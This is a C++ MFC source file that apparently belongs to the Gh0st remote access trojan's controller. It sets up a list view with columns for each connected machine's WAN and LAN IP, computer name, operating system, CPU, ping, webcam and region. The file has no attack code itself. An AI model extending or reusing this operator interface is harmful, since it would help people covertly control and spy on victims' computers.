
// Gh0stView.cpp : CGh0stView 类的实现
//

#include "stdafx.h"
// SHARED_HANDLERS 可以在实现预览、缩略图和搜索筛选器句柄的
// ATL 项目中进行定义，并允许与该项目共享文档代码。
#ifndef SHARED_HANDLERS
#include "Gh0st.h"
#endif

#include "Gh0stDoc.h"
#include "Gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct  
{
	char *title;
	int nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{"ID",48},
	{"WAN",102},
	{"LAN",102},
	{"计算机名/备注",107},
	{"操作系统",128},
	{"CPU",55},
	{"Ping",40},
	{"摄像头",51},
	{"区域",100}
};

int g_Column_Width = 0;
int g_Column_Count = (sizeof(g_Column_Data) / 8);
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CListView)

BEGIN_MESSAGE_MAP(CGh0stView, CListView)
END_MESSAGE_MAP()

// CGh0stView 构造/析构

CGh0stView::CGh0stView()
{
	// TODO: 在此处添加构造代码

}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: 在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

void CGh0stView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();
	m_pListCtrl = &GetListCtrl();
	m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	// TODO: 调用 GetListCtrl() 直接访问 ListView 的列表控件，
	//  从而可以用项填充 ListView。

		for (int i=0;i < g_Column_Count;i++)
		{
			m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
			m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
			g_Column_Width += g_Column_Data[i].nWidth;
		}

}


// CGh0stView 诊断

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() const // 非调试版本是内联的
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif //_DEBUG


// CGh0stView 消息处理程序
